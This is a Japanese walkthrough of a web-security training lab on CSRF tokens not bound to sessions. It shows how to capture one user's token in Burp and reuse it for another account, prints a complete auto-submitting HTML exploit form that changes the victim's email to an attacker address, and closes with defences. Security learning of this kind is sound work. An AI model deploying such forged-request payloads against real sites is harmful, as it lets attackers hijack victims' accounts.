
# CSRFトークンがセッションに紐付けられていない

# ラボ手順


---

## STEP 1：wienerアカウントで CSRF トークンを入手

1. Burp のブラウザでラボを開く  
2. `wiener:peter` でログイン  
3. 「Update email」フォームを開き、メールアドレスを適当に入力  
4. **Intercept ON** にして「Update」をクリック  
5. Burp のリクエストを確認：

```
POST /my-account/change-email HTTP/1.1
...
email=test%40test.com&csrf=aBcDeFgHiJ123456
```

6. `csrf=` の値をメモ（例：`aBcDeFgHiJ123456`）  
7. **Drop**（← 重要：トークンを消費しないため）  
8. Intercept を **OFF** に戻す

---

## STEP 2：トークンが別セッションでも使えるか確認（任意）

※確認したい場合のみ。スキップ可。

1. Burp のブラウザで **プライベートウィンドウ** を開く  
2. `carlos:montoya` でログイン  
3. Update email フォームを開き、リクエストを Repeater に送る  
4. Repeater で `csrf=` を **wiener のトークンに書き換えて Send**  
5. `200 OK` が返れば → **セッション紐付けなしを確認！**

---

## STEP 3：エクスプロイト HTML を作成

1. ラボの「**Go to exploit server**」をクリック  
2. Body 欄に以下を貼り付け：

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com">
      <input type="hidden" name="csrf" value="aBcDeFgHiJ123456">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 🔧 書き換える箇所

| 箇所 | 内容 |
|------|------|
| `YOUR-LAB-ID` | 自分のラボURLに変更 |
| `value="pwned@evil.com"` | wiener/carlos **以外** のメールアドレス |
| `csrf=` の値 | STEP 1 で取得した **wiener のトークン** |

# 🔥 CSRFトークンがセッションに紐付けられていない脆弱性まとめ

## 🧨 どーいう脆弱性？
**CSRFトークンがユーザーのセッションと紐付いていない(そのCSRFトークンが “誰のものか” をサーバーが確認していない状態

つまり、
AさんのトークンをBさんのリクエストに使ってもサーバーが受け入れてしまう という異常な状況。)**ため
「誰のトークンでも誰のアカウント操作にも使えてしまう」状態。

本来：  
- トークンは **ユーザーごと**  
- **1回限り**  
- **セッションと紐付け**  
であるべき。

しかしこのラボでは：

- wiener のトークンを  
- carlos のアカウント操作に  
- そのまま使えてしまう

＝ **CSRF防御が形だけで、実質無効化されている**。

---

## 🔍 どう気づいた？
1. wiener でログインして Update email を開く  
2. Burp でリクエストをキャプチャ  
3. `csrf=xxxx` が見える  
4. **リクエストを Drop してトークンを消費させない**  
5. 別セッション（プライベートウィンドウ）で carlos にログイン  
6. Repeater で carlos のリクエストの `csrf=` を wiener の値に書き換えて送信  
7. **200 OK → トークンがセッションと紐付いていないと判明**

つまり、  
「他人のトークンを使っても通る」  
という異常挙動で気づく。

---

## 💥 どう攻撃した？
攻撃の流れはシンプル：

1. **攻撃者が wiener のトークンを取得**  
2. そのトークンを使った **偽フォーム** を作成  
3. 被害者（carlos）がそのページを開くと  
4. 自動で email 更新リクエストが送信される  
5. サーバーは「トークンが正しい」と判断して処理  
6. **被害者のメールアドレスが攻撃者の指定した値に書き換わる**

つまり：

> 「攻撃者が取得したトークンを、被害者のセッションで使わせる」

これが成立してしまう。

---

## 🛡️ どう対策する？
CSRF対策の基本をちゃんと守ること。

### ✔ トークンをセッションと紐付ける  
- トークンは **ユーザーごとに生成**  
- **セッションIDと紐付けて検証**  
- 他人のトークンは絶対に通さない

### ✔ トークンを使い捨てにする（ワンタイム）  
- 1回使ったら無効化  
- 再利用を禁止

### ✔ SameSite=Lax/Strict Cookie を設定  
- クロスサイトからの自動送信を防ぐ

### ✔ Referer / Origin チェック  
- 正規ドメインからのリクエストのみ許可

### ✔ GET で状態変更しない  
- POST/PUT/DELETE のみに限定

---

# 🎤 まとめ

> この脆弱性は、CSRFトークンがユーザーのセッションと紐付いていないため、他人のトークンを使ってもリクエストが通ってしまう問題です。  
> 検証では、wiener のトークンを取得して、別ユーザーの carlos のメール更新リクエストに差し替えて送信したところ、200 OK が返り、セッション紐付けが無いことを確認しました。  
> 攻撃は、攻撃者が取得したトークンを埋め込んだ偽フォームを被害者に踏ませるだけで成立します。  
> 対策としては、トークンをセッションと厳密に紐付け、ワンタイム化し、SameSite Cookie や Origin チェックを併用することが重要です。
